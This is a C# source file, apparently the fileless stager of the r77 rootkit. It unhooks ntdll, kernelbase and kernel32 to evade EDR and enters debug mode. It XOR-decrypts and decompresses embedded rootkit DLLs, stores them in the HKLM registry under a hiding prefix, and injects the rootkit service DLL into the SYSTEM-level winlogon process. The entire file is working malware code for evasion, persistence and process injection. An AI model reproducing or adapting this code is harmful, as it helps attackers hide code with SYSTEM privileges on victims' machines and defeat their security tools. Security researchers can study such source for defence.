﻿using Global;
using Microsoft.Win32;
using Stager.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;

/// <summary>
/// Fileless stager for the r77 service.
/// <para>This executable is spawned by a Windows service (powershell) and starts the r77 service.</para>
/// </summary>
public static class Program
{
	// The target framework is .NET 3.5.
	// Normally, if .NET 4.x is installed, but .NET 3.5 isn't, this executable doesn't start.
	// However, the target framework is not relevant in the powershell context.
	// The executable will run, if *either* .NET 3.5 *or* .NET 4.x is installed.
	// To immediately spot code that is incompatible with .NET 3.5, the target framework is set to .NET 3.5.
	public static void Main()
	{
		// Unhook DLL's that are monitored by EDR.
		// Otherwise, the call sequence analysis of process injection gets detected and the stager is terminated.
		Unhook.UnhookDll("ntdll.dll");
		if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8) // Unhooking kernel32.dll does not work on Windows 7 x86.
		{
			Unhook.UnhookDll("kernelbase.dll");
			Unhook.UnhookDll("kernel32.dll");
		}

		Process.EnterDebugMode();

		// Write r77-x86.dll and r77-x64.dll to the registry.
		// Install.exe could also do this, but .NET has better compression routines.
		using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE", true))
		{
			key.SetValue(R77Const.HidePrefix + "dll32", Decompress(Decrypt(Resources.Dll32)));
			key.SetValue(R77Const.HidePrefix + "dll64", Decompress(Decrypt(Resources.Dll64)));
		}

		// Get r77 service DLL.
		byte[] payload = Decompress(Decrypt(IntPtr.Size == 4 ? Resources.Service32 : Resources.Service64));

		// Inject the r77 service DLL into the a suitable process running under the SYSTEM user.
		int processId = Process.GetProcessesByName("winlogon")[0].Id;
		Inject.InjectDll(processId, payload);
	}

	private static byte[] Decompress(byte[] data)
	{
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (GZipStream gzipStream = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
			{
				Helper.CopyStream(gzipStream, memoryStream);
			}

			return memoryStream.ToArray();
		}
	}
	private static byte[] Decrypt(byte[] data)
	{
		// Only a trivial encryption algorithm is used.
		// This improves the stability of the fileless startup, because less .NET classes are imported that may not be present on the target computer.

		int key = BitConverter.ToInt32(data, 0);
		byte[] decrypted = new byte[data.Length - 4];

		for (int i = 0; i < decrypted.Length; i++)
		{
			decrypted[i] = (byte)(data[i + 4] ^ key);
			key = key << 1 | key >> (32 - 1);
		}

		return decrypted;
	}
}